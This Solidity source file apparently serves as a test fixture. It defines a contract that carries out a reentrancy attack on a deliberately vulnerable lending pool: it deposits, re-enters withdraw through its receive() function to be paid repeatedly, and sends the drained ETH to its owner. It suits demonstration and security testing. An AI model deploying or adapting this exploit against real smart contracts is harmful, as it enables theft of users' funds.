// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Malicious contract used only for the reentrancy demonstration test

interface IVulnerableLendingPool {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

/**
 *      Attack flow:
 *      1. attack() deposits msg.value into VulnerableLendingPool.
 *      2. attack() calls withdraw(msg.value).
 *      3. VulnerableLendingPool sends ETH back before updating deposited.
 *      4. receive() is triggered and re-enters withdraw(msg.value).
 *      5. The pool still sees the original deposited balance and pays again.
 */
contract ReentrancyAttacker {
    IVulnerableLendingPool public immutable target;
    address public immutable owner;

    uint256 public withdrawAmount;
    uint256 public remainingReentries;

    event AttackStarted(uint256 depositAmount, uint256 extraWithdrawals);
    event Reentered(uint256 remainingReentries, uint256 attackerBalance);
    event StolenFundsWithdrawn(address indexed owner, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor(address targetAddress) {
        require(targetAddress != address(0), "Invalid target");

        target = IVulnerableLendingPool(targetAddress);
        owner = msg.sender;
    }

    function attack(uint256 extraWithdrawals) external payable onlyOwner {
        require(msg.value > 0, "Attack needs ETH");
        require(extraWithdrawals > 0, "Invalid reentry count");

        withdrawAmount = msg.value;
        remainingReentries = extraWithdrawals;

        emit AttackStarted(msg.value, extraWithdrawals);

        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (
            remainingReentries > 0 &&
            address(target).balance >= withdrawAmount
        ) {
            remainingReentries--;

            emit Reentered(remainingReentries, address(this).balance);

            target.withdraw(withdrawAmount);
        }
    }

    function withdrawStolenFunds() external onlyOwner {
        uint256 amount = address(this).balance;

        require(amount > 0, "No funds");

        (bool success, ) = payable(owner).call{value: amount}("");
        require(success, "Owner transfer failed");

        emit StolenFundsWithdrawn(owner, amount);
    }
}
